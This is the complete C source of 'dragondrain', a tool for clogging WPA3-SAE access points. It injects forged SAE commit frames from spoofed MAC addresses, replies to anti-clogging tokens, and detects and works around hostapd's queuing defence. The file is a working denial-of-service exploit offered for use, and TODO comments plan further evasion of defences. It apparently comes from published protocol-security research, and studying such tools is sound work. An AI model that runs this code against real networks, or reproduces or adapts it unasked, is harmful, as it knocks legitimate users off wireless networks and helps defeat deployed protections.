// TODO: - Implement the different strategies on whether a new element/scalar
//         is generated or not. This can then be used to carry out simplified
//	   clogging attacks from extremely low-resource devices.
// TODO: - Add option to switch between groups to bypass new hostap defense.
// TODO: - Refine timing of attacking hostapd's queuing so client can't get in between
// TODO: - Scan the beacon frame to see if the AP supports SAE or not.
// TODO: - Add explanation on numclients to the readme
// TODO: - Add two explicit examples to efficiently clog hostapd
// TODO: - Automatically determine if it also supports group 21 or 20, and then
//         use that instead of the default group 19.

/*
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/timerfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>
#include <string.h>
#include <stdarg.h>
#include <poll.h>
#include <stdbool.h>
#include <assert.h>

#include <openssl/evp.h>
#include <openssl/ec.h>
#include <openssl/bn.h>

#include "aircrack-osdep/osdep.h"
#include "aircrack-util/common.h"
#include "version.h"

#define RATE_1M 1000000
#define RATE_2M 2000000
#define RATE_5_5M 5500000
#define RATE_11M 11000000
#define RATE_6M 6000000
#define RATE_9M 9000000
#define RATE_12M 12000000
#define RATE_18M 18000000
#define RATE_24M 24000000
#define RATE_36M 36000000
#define RATE_48M 48000000
#define RATE_54M 54000000

#ifdef __GNUC__
#define UNUSED_VARIABLE __attribute__ ((unused))
#else
#define UNUSED_VARIABLE
#endif


uint8_t AUTH_REQ_SAE_COMMIT_HEADER[] = 
	/* 802.11 header */ \
	"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"                                 \
	/* SAE Commit frame */                                             \
	"\x03\x00\x01\x00\x00\x00\x13\x00";
	/* Scalar */
	/* Finite Field Element - X-coordinate */
	/* Finite Field Element - Y-coordinate */
size_t AUTH_REQ_SAE_COMMIT_HEADER_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_HEADER) - 1;

#define RX_RING_SIZE 5

static struct state
{
	struct wif *wi;
	unsigned char bssid[6];
	unsigned char srcaddr[6];
	int debug_level;
	int force_attack;

	/** Injection parameters */
	int injection_rate; /** #handshake to forge every second */
	int injection_bitrate;
	int frames_per_burst;
	int numclients;
	int initial_burst;
	int inject_malformed;

	/** Various variables */
	bool started_clogging;
	int nextaddr;
	int time_fd_inject;

	/** Crypto variables */
	int groupid;
	const EC_GROUP *group;
	const EC_POINT *generator;
	EC_POINT *element;
	BIGNUM *prime;
	BIGNUM *a;
	BIGNUM *b;
	BIGNUM *order;
	BN_CTX *bnctx;
	BIGNUM *scalar;

	/** For monitoring status */
	int time_fd_status;
	int sent_commits;
	int rx_clogging_token;
	int rx_commits_ring[RX_RING_SIZE];
	int rx_commits_idx;

	/** For detecting's hostapd dev version queuing */
	int hostapd_queuing_rate;
	int total_running_time;
	int is_attacking_queuing;
} _state;

static struct state * get_state(void) { return &_state; }

void print_status(struct state *state);

static void debug(struct state *state, int level, char *fmt, ...)
{
	va_list ap;

	if (state->debug_level < level) return;

	printf("\r\x1b[0K");

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);

	print_status(state);
}

static int vsystem(const char *format, ...)
{
	char command[1024];
	va_list ap;

	va_start(ap, format);
	vsnprintf(command, sizeof(command), format, ap);
	va_end(ap);

	return system(command);
}

static void card_open(struct state *state, char *dev)
{
	struct wif * wi = wi_open(dev);

	if (!wi) err(1, "wi_open()");
	state->wi = wi;
}

static inline int card_set_chan(struct state *state, int chan)
{
	return wi_set_channel(state->wi, chan);
}

static inline int card_get_chan(struct state *state)
{
	return wi_get_channel(state->wi);
}

static int int_to_bitrate(int rate)
{
	switch (rate) {
	case  1: return RATE_1M;
	case  2: return RATE_2M;
	case  5: return RATE_5_5M;
	case 11: return RATE_11M;
	case  6: return RATE_6M;
	case  9: return RATE_9M;
	case 12: return RATE_12M;
	case 18: return RATE_18M;
	case 24: return RATE_24M;
	case 36: return RATE_36M;
	case 48: return RATE_48M;
	case 54: return RATE_54M;
	default: return RATE_1M;
	}
}

/**
 * Making the ath9k_htc use a specific bitrate to inject packets
 * is tedious. Two common methods fail with this device:
 *
 * - The bitrate field in the RadioTap header is ignored.
 * - Executing `iw dev set bitrates legacy-2.4 $bitrate` on a device
 *   in monitor mode results in an error.
 *
 * We opt for the following workaround: we first put the device into
 * managed mode, and then execute `iw dev set bitrates legacy-2.4 $bitrate`.
 * This command does work when the device is in managed mode. We then
 * switch the device back to monitor mode. Interestinly, the device
 * will keep using the configured bitrate even after switching to
 * monitor mode.
 *
 * Although the above workaround is ugly, it works without having to
 * make the user recompile the kernel or installing custom drivers.
 * The downside is that it has only been tested with ath9k_htc.
 */
static int card_set_rate_workaround(struct state *state, int rate)
{
	char interface[MAX_IFACE_NAME];

	// Copy interface name, and close the interface
	strcpy(interface, state->wi->wi_interface);
	wi_close(state->wi);

	// Easiest is to just call ifconfig and iw
	if (vsystem("ifconfig %s down", interface) ||
	    vsystem("iw %s set type managed", interface) ||
	    vsystem("ifconfig %s up", interface) ||
	    vsystem("iw %s set bitrates legacy-2.4 %d", interface, rate) ||
	    vsystem("ifconfig %s down", interface) ||
	    vsystem("iw %s set type monitor", interface) ||
	    vsystem("ifconfig %s up", interface))
	{
		fprintf(stderr, "Failed to set bitrate to %d using workaround method\n", rate);
		return 1;
	}

	// Open interface again
	state->wi = wi_open(interface);

	return 0;
}

static inline int card_set_rate(struct state *state, int rate)
{
	if (wi_set_rate(state->wi, int_to_bitrate(rate)))
	{
		/* Attempt workaround to set the desired bitrate */
		return card_set_rate_workaround(state, rate);
	}

	return 0;
}

static inline int card_get_rate(struct state *state)
{
	return wi_get_rate(state->wi);
}

static inline int card_get_monitor(struct state *state)
{
	return wi_get_monitor(state->wi);
}

static int
card_read(struct state *state, void *buf, int len, struct rx_info *ri)
{
	int rc;

	if ((rc = wi_read(state->wi, buf, len, ri)) == -1)
		err(1, "wi_read()");

	return rc;
}

static inline int
card_write(struct state *state, void *buf, int len, struct tx_info *ti)
{
	return wi_write(state->wi, buf, len, ti);
}

static inline int card_get_mac(struct state *state, unsigned char * mac)
{
	return wi_get_mac(state->wi, mac);
}

static void
open_card(struct state *state, char * dev, int chan)
{
	debug(state, 0, "Opening card %s\n", dev);
	card_open(state, dev);
	debug(state, 0, "Setting to channel %d\n", chan);
	if (card_set_chan(state, chan) == -1) err(1, "card_set_chan()");
}

int bignum2bin(BIGNUM *num, uint8_t *buf, size_t outlen)
{
	int num_bytes = BN_num_bytes(num);
	int offset = outlen - num_bytes;

	memset(buf, 0, offset);
	BN_bn2bin(num, buf + offset);

	return 0;
}

uint8_t * ecc_point2bin(struct state *state, EC_POINT *point, uint8_t *out)
{
	int num_bytes = BN_num_bytes(state->prime);
	BIGNUM *bignum_x = BN_new();
	BIGNUM *bignum_y = BN_new();
	// XXX check allocation results

	// XXX check return value
	EC_POINT_get_affine_coordinates_GFp(state->group, point, bignum_x, bignum_y, state->bnctx);

	// XXX check if out buffer is large enough
	bignum2bin(bignum_x, out, num_bytes);
	bignum2bin(bignum_y, out + num_bytes, num_bytes);

	BN_free(bignum_y);
	BN_free(bignum_x);

	return out + 2 * num_bytes;
}

static void inject_sae_commit(struct state *state, unsigned char *srcaddr, const uint8_t *token, int token_len)
{
	int num_bytes = BN_num_bytes(state->prime);
	unsigned char buf[512];
	uint8_t *pos;

	memcpy(buf, AUTH_REQ_SAE_COMMIT_HEADER, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
	pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;

	memcpy(buf + 4, state->bssid, 6);
	memcpy(buf + 10, srcaddr, 6);
	memcpy(buf + 16, state->bssid, 6);

	/* fill in the correct group id */
	buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = state->groupid;

	/* token comes after status and group id, before scalar and element */
	if (token != NULL) {
		assert(pos - buf == 24 + 8);
		memcpy(pos, token, token_len);
		pos += token_len;
	}

	/* next is the random scalar */
	BN_add_word(state->scalar, 1);
	bignum2bin(state->scalar, pos, num_bytes);
	pos += num_bytes;

	/* finnaly we have the elliptic curve point */
	EC_POINT_add(state->group, state->element, state->element, state->generator, state->bnctx);
	pos = ecc_point2bin(state, state->element, pos);

	if (card_write(state, buf, pos - buf, NULL) == -1)
		perror("card_write");

	state->sent_commits++;
}

static void inject_malformed_sae_commit(struct state *state, unsigned char *srcaddr)
{
	unsigned char buf[512];
	uint8_t *pos;

	memcpy(buf, AUTH_REQ_SAE_COMMIT_HEADER, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
	pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;

	memcpy(buf + 4, state->bssid, 6);
	memcpy(buf + 10, srcaddr, 6);
	memcpy(buf + 16, state->bssid, 6);

	/* fill in the correct group id */
	buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = state->groupid;

	/* no random scalar */
	/* no elliptic curve point */

	if (card_write(state, buf, pos - buf, NULL) == -1)
		perror("card_write");
}

static void inject_commits(struct state *state)
{
	if (!state->started_clogging)
		return;

	debug(state, 2, "Injecting %d commit frames using group %d%s\n",
	      state->frames_per_burst, state->groupid,
	      state->inject_malformed ? " (with malformed frames)" : "");
	for (int i = 0; i < state->frames_per_burst; ++i)
	{
		state->srcaddr[5] = state->nextaddr;
		state->nextaddr = (state->nextaddr + 1) % state->numclients;

		inject_sae_commit(state, state->srcaddr, NULL, 0);
		if (state->inject_malformed)
			inject_malformed_sae_commit(state, state->srcaddr);
	}
}

static void send_initial_burst(struct state *state)
{
	if (state->initial_burst < 1)
		return;

	debug(state, 0, "Injecting initial burst of %d commit frames%s\n",
	      state->initial_burst,
	      state->inject_malformed ? " (with malformed frames)" : "");
	for (int i = 0; i < state->initial_burst; ++i)
	{
		state->srcaddr[5] = state->nextaddr;
		state->nextaddr = (state->nextaddr + 1) % state->numclients;

		inject_sae_commit(state, state->srcaddr, NULL, 0);
		if (state->inject_malformed)
			inject_malformed_sae_commit(state, state->srcaddr);
	}
}

static void set_clogging_timer(struct state *state)
{
	struct itimerspec timespec;
	long interval;

	/* initial expiration of the timer */
	timespec.it_value.tv_sec = 0;
	timespec.it_value.tv_nsec = 1000;

	/* periodic expiration of the timer */
	interval = (1000 * 1000 * 1000 / state->injection_rate) * state->frames_per_burst;
	timespec.it_interval.tv_nsec = interval % (1000 * 1000 * 1000);
	timespec.it_interval.tv_sec = interval / (1000 * 1000 * 1000);

	debug(state, 0, "Will forge %d handshakes/second (%d commit%s every %d sec %d msec)\n",
		state->injection_rate, state->frames_per_burst,
		state->frames_per_burst > 1 ? "s" : "",
		timespec.it_interval.tv_sec, timespec.it_interval.tv_nsec / 1000000);

	if (timerfd_settime(state->time_fd_inject, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");
	state->started_clogging = true;
}

static void start_clogging(struct state *state)
{
	send_initial_burst(state);
	set_clogging_timer(state);
}

static void process_packet(struct state *state, unsigned char *buf, int len)
{
	int pos_bssid, pos_src, pos_dst;

	debug(state, 3, "process_packet (length=%d)\n", len);

	/* Ignore retransmitted frames - seems like aircrack-ng already does this?! */
	if (buf[1] & 0x08)
		return;

	/* Extract addresses */
	switch (buf[1] & 3)
	{
		case 0:
			pos_bssid = 16;
			pos_src = 10;
			pos_dst = 4;
			break;
		case 1:
			pos_bssid = 4;
			pos_src = 10;
			pos_dst = 16;
			break;
		case 2:
			pos_bssid = 10;
			pos_src = 16;
			pos_dst = 4;
			break;
		default:
			pos_bssid = 10;
			pos_dst = 16;
			pos_src = 24;
			break;
	}

	/* Must be sent by AP */
	if (memcmp(buf + pos_bssid, state->bssid, 6) != 0
	    || memcmp(buf + pos_src, state->bssid, 6) != 0)
		return;

	/* Detect presense of AP through beacons */
	if (buf[0] == 0x80 && !state->started_clogging)
	{
		debug(state, 0, "Detected AP!");
		start_clogging(state);
	}

	if (len > 24 + 8 && buf[0] == 0xb0 && buf[24] == 0x03 && buf[26] == 0x01)
	{
		/* Handle Anti-Clogging Tokens */
		if (buf[28] == 0x4C)
		{
			unsigned char *token = buf + 24 + 8;
			int token_len = len - 24 - 8;

			state->rx_clogging_token++;

			inject_sae_commit(state, buf + 4, token, token_len);
		}
		else if (buf[28] == 0x00)
		{
			state->rx_commits_ring[state->rx_commits_idx]++;
		}
	}
}

static int card_receive(struct state *state)
{
	unsigned char buf[2048];
	int len;
	struct rx_info ri;

	len = card_read(state, buf, sizeof(buf), &ri);
	if (len < 0) {
		fprintf(stderr, "%s: failed to read packet\n", __FUNCTION__);
		return -1;
	}

	process_packet(state, buf, len);

	return len;
}

void print_status(struct state *state)
{
	int rx_total_commits = 0;
	for (int i = 0; i < RX_RING_SIZE; ++i)
		rx_total_commits += state->rx_commits_ring[i];

	printf("\r[ STATUS: %3.2lf forged handshakes/sec | %3d AC tokens received/sec | %3d commits sent/sec ]",
		 rx_total_commits / (double)RX_RING_SIZE, state->rx_clogging_token, state->sent_commits);
	fflush(stdout);
}

void detect_hostapd_queuing(struct state *state)
{
	int rx_total_commits = 0;
	for (int i = 0; i < RX_RING_SIZE; ++i)
		rx_total_commits += state->rx_commits_ring[i];

	state->total_running_time++;
	if (state->hostapd_queuing_rate && !state->is_attacking_queuing && state->total_running_time > 2 * RX_RING_SIZE)
	{
		if (750 * rx_total_commits < 1000 * RX_RING_SIZE)
		{
			debug(state, 0, "Detected hostapd's queuing! Setting handshake forge rate accordingly.\n");

			state->injection_rate = state->hostapd_queuing_rate;
			state->frames_per_burst = 1;
			set_clogging_timer(state);

			state->is_attacking_queuing = 1;
		}
	}
}

static void event_loop(struct state *state, char * dev, int chan)
{
	// Step 1 -- Initialize Wi-Fi interface
	open_card(state, dev, chan);
	if (state->injection_bitrate && card_set_rate(state, state->injection_bitrate))
		debug(state, 0, "Warning: failed to set injection bitrate to %d\n", state->injection_bitrate);

	card_get_mac(state, state->srcaddr);
	debug(state, 0, "Will spoof MAC addresses in the form %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
		state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->numclients - 1);

	// Step 2 -- Create timer for packet injection
	state->time_fd_inject = timerfd_create(CLOCK_MONOTONIC, 0);
	if (state->time_fd_inject == -1)
		perror("timerfd_create()");

	// Step 3 -- Create timer for status messages
	state->time_fd_status = timerfd_create(CLOCK_MONOTONIC, 0);
	if (state->time_fd_status == -1)
		perror("timerfd_create()");

	struct itimerspec timespec;
	/* initial expiration of the timer */
	timespec.it_value.tv_sec = 1;
	timespec.it_value.tv_nsec = 0;
	/* periodic expiration of the timer */
	timespec.it_interval.tv_nsec = 0;
	timespec.it_interval.tv_sec = 1;
	if (timerfd_settime(state->time_fd_status, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");

	// Step 3 -- Start main loop
	if (state->force_attack) {
		debug(state, 0, "Skipping detection of AP ...\n");
		start_clogging(state);
	} else {
		debug(state, 0, "Searching for AP ...\n");
	}

	while (1)
	{
		struct pollfd fds[3];
		int card_fd = wi_fd(state->wi);

		memset(&fds, 0, sizeof(fds));
		fds[0].fd = card_fd;
		fds[0].events = POLLIN;
		fds[1].fd = state->time_fd_inject;
		fds[1].events = POLLIN;
		fds[2].fd = state->time_fd_status;
		fds[2].events = POLLIN;

		if (poll(fds, 3, -1) == -1)
			err(1, "poll()");

		if (fds[0].revents & POLLIN)
			card_receive(state);

		if (fds[1].revents & POLLIN) {
			uint64_t exp;
			int UNUSED_VARIABLE rval;

			rval = read(state->time_fd_inject, &exp, sizeof(uint64_t));
			inject_commits(state);
		}

		if (fds[2].revents & POLLIN) {
			uint64_t exp;
			int UNUSED_VARIABLE rval;

			rval = read(state->time_fd_status, &exp, sizeof(uint64_t));

			print_status(state);
			detect_hostapd_queuing(state);

			state->sent_commits = 0;
			state->rx_clogging_token = 0;
			state->rx_commits_idx = (state->rx_commits_idx + 1) % RX_RING_SIZE;
			state->rx_commits_ring[state->rx_commits_idx] = 0;

		}
	}
}

// FIXME: Share this function between dragontime and dragondrain
static bool is_module_loaded(const char *module)
{
	char line[256];
	FILE *fp = NULL;
	int loaded = false;

	fp = fopen("/proc/modules", "r");
	if (fp == NULL) {
		fprintf(stderr, "Failed to check if kernel module %s is loaded", module);
		perror("");
		return false;
	}

	while (!loaded && fgets(line, sizeof(line), fp) != NULL) {
		loaded = strncmp(line, module, strlen(module)) == 0 &&
		         line[strlen(module)] == ' ';
	}

	fclose(fp);
	return loaded;
}

static void usage(char * p)
{
	char * version_info
		= getVersion("dragondrain", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC);
	printf("\n"
		   "  %s - (C) 2018-2019 Mathy Vanhoef\n"
		   "\n"
		   "  Usage: dragondrain -d iface -a bssid -c chan <extra options>\n"
		   "\n"
		   "  Options:\n"
		   "\n"
		   "       -h         : This help screen\n"
		   "       -d iface   : Wifi interface to use\n"
		   "       -a bssid   : Target Access Point MAC address\n"
		   "       -c chan    : Channel the AP is on\n"
		   "       -g group   : The curve to use (either 19 or 21)\n"
		   "       -v level   : Debug level (0 to 3; default: 1)\n"
		   "       -r rate    : Number of handshakes to forge every second\n"
		   "       -b bitrate : Bitrate of injected frames (e.g. 1, 6, 12, 24, 48, 54)\n"
		   "       -n num     : Number of different MAC addresses to spoof (default 256)\n"
		   "       -i num     : Number of initial commits to inject at start of attack\n"
		   "       -p num     : Number of commits to inject per burst (default 1)\n"
		   "       -m         : Inject a malfored Commit after every spoofed one\n"
		   "       -M         : Detect and abuse hostapd's queuing behaviour\n"
		   "       -f         : Don't scan for the AP\n"
		   "\n",
		   version_info);
	free(version_info);
}

int iana_to_openssl_id(int groupid)
{
	switch (groupid) {
	case 19: return NID_X9_62_prime256v1;
	case 20: return NID_secp384r1;
	case 21: return NID_secp521r1;
	case 25: return NID_X9_62_prime192v1;
	case 26: return NID_secp224r1;
	case 27: return NID_brainpoolP224r1;
	case 28: return NID_brainpoolP256r1;
	case 29: return NID_brainpoolP384r1;
	case 30: return NID_brainpoolP512r1;
	default: return -1;
	}
}

void free_crypto_context(struct state *state)
{
	BN_free(state->prime);
	BN_free(state->a);
	BN_free(state->b);
	BN_free(state->order);
	BN_free(state->scalar);
	EC_POINT_free(state->element);
	BN_CTX_free(state->bnctx);
}

int initialize_crypto_context(struct state *state)
{
	BIGNUM *randbn;
	int openssl_groupid;

	openssl_groupid = iana_to_openssl_id(state->groupid);
	if (openssl_groupid == -1) {
		fprintf(stderr, "Unrecognized curve ID: %d\n", state->groupid);
		return -1;
	}

	state->group = EC_GROUP_new_by_curve_name(openssl_groupid);
	if (state->group == NULL) {
		fprintf(stderr, "OpenSSL failed to load curve %d\n", state->groupid);
		return -1;
	}

	state->bnctx = BN_CTX_new();
	state->prime = BN_new();
	state->a = BN_new();
	state->b = BN_new();
	state->order = BN_new();
	state->scalar = BN_new();
	state->element = EC_POINT_new(state->group);
	if (state->bnctx == NULL || state->prime == NULL || state->a == NULL ||
	    state->b == NULL || state->order == NULL || state->scalar == NULL ||
	    state->element == NULL) {
		fprintf(stderr, "Failed to allocate memory for BIGNUMs and/or ECC points\n");
		free_crypto_context(state);
		return -1;
	}

	if (!EC_GROUP_get_curve_GFp(state->group, state->prime, state->a, state->b, state->bnctx) ||
	    !EC_GROUP_get_order(state->group, state->order, state->bnctx)) {
		fprintf(stderr, "Failed to get parameters of group %d\n", state->groupid);
		free_crypto_context(state);
		return -1;
	}

	state->generator = EC_GROUP_get0_generator(state->group);
	if (state->generator == NULL || state->element == NULL) {
		fprintf(stderr, "Failed to get the generator of group %d\n", state->groupid);
		free_crypto_context(state);
		return -1;
	}

	randbn = BN_new();
	if (randbn == NULL) {
		fprintf(stderr, "Failed to element BIGNUM\n");
		free_crypto_context(state);
		return -1;
	}

	// For our purposes, a 64-bit random number is more than enough
	BN_pseudo_rand(randbn, 64, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);
	BN_pseudo_rand(state->scalar, BN_num_bits(state->order) - 1, BN_RAND_TOP_ANY, BN_RAND_BOTTOM_ANY);

	if (!EC_POINT_mul(state->group, state->element, NULL, state->generator, randbn, state->bnctx)) {
		fprintf(stderr, "EC_POINT_mul failed\n");
		BN_free(randbn);
		free_crypto_context(state);
		return -1;
	}

	BN_free(randbn);
	return 0;
}

int main(int argc, char * argv[])
{
	char * device = NULL;
	int ch;
	int chan = 1;
	struct state *state = get_state();

	memset(state, 0, sizeof(*state));
	state->nextaddr = 0;
	state->debug_level = 1;
	state->started_clogging = false;
	state->groupid = 19;
	state->injection_rate = 25;
	state->injection_bitrate = 0;
	state->frames_per_burst = 1;
	state->numclients = 256;

	while ((ch = getopt(argc, argv, "d:v:c:a:g:r:b:n:i:mM:hf")) != -1)
	{
		switch (ch)
		{
			case 'd':
				device = optarg;
				break;

			case 'v':
				state->debug_level = atoi(optarg);
				break;

			case 'c':
				chan = atoi(optarg);
				break;

			case 'a':
				if (getmac(optarg, 1, state->bssid) != 0)
				{
					printf("Invalid AP MAC address.\n");
					printf("\"%s --help\" for help.\n", argv[0]);
					return 1;
				}
				break;

			case 'g':
				state->groupid = atoi(optarg);
				if (iana_to_openssl_id(state->groupid) == -1) {
					fprintf(stderr, "The given group id (-g) of %s is not supported\n", optarg);
					exit(1);
				}
				break;

			case 'r':
				state->injection_rate = atoi(optarg);
				if (state->injection_rate < 1) {
					printf("Please enter a handshake forge rate above zero\n");
					return 1;
				}
				break;

			case 'b':
				state->injection_bitrate = atoi(optarg);
				if (state->injection_bitrate < 1 || state->injection_bitrate > 54) {
					printf("Please enter a bitrate between 1 and 54\n");
					return 1;
				}
				break;

			case 'p':
				state->frames_per_burst = atoi(optarg);
				if (state->frames_per_burst < 1) {
					printf("Please enter a burst number above zero\n");
					return 1;
				}
				break;

			case 'n':
				state->numclients = atoi(optarg);
				if (state->numclients < 1 || state->numclients > 256) {
					printf("Number of client MAC addresses to spoof must be between 1 and 256\n");
					return 1;
				}
				break;

			case 'i':
				state->initial_burst = atoi(optarg);
				if (state->initial_burst < 1) {
					printf("Number of initial commits to send must be a positive number\n");
					return 1;
				}
				break;

			case 'm':
				state->inject_malformed = 1;
				break;

			case 'M':
				state->hostapd_queuing_rate = atoi(optarg);
				if (state->hostapd_queuing_rate < 1) {
					printf("Number of frames to inject against hostapd queuing must be positive\n");
					return 1;
				}
				break;

			case 'f':
				state->force_attack = 1;
				break;

			case 'h':
			default:
				usage(argv[0]);
				exit(1);
				break;
		}
	}

	// Check that the required arguments are provided
	if (!device || chan <= 0 || memcmp(state->bssid, ZERO, 6) == 0) {
		usage(argv[0]);
		printf("\n");

		if (!device)
			printf("Please specify the monitor interface to use using -d\n");
		if (chan <= 0)
			printf("Please specify the channel to use using -c\n");
		if (memcmp(state->bssid, ZERO, 6) == 0)
			printf("Please specify the MAC address of the target using -a\n");
		printf("\n");

		exit(1);
	}

	// Warn user if spoofed addresses won't be acknowledged
	// FIXME: Check that the device being used is the Atheros one
	if (!is_module_loaded("ath")) {
		printf("\n"
		       "Warning: please use an Atheros device. This tool was only tested using an\n"
		       "         Atheros ath9k_htc device, combined with the ath_masker kernel module,\n"
                       "         so that frames sent to the spoofed MAC addresses are acknowledged\n"
		       "         by the Wi-Fi chip.\n\n"
		       "         Press CTRL+C to exit, or enter to coninue...");
		getc(stdin);
		printf("\n");
	}
	if (is_module_loaded("ath") && !is_module_loaded("ath_masker")) {
		printf("\n"
		       "Warning: please load the kernel module ath_masker so frames send to spoofed\n"
		       "         MAC addresses are acknowledged. Download the module code at\n"
		       "         https://github.com/vanhoefm/ath_masker\n\n"
		       "         Press CTRL+C to exit, or enter to coninue...");
		getc(stdin);
		printf("\n");
	}

	// Initialize the crypto context
	if (initialize_crypto_context(state) < 0) {
		fprintf(stderr, "Failed to initialize crypto parameters, exiting...\n");
		return 1;
	}

	event_loop(state, device, chan);
	exit(0);
}
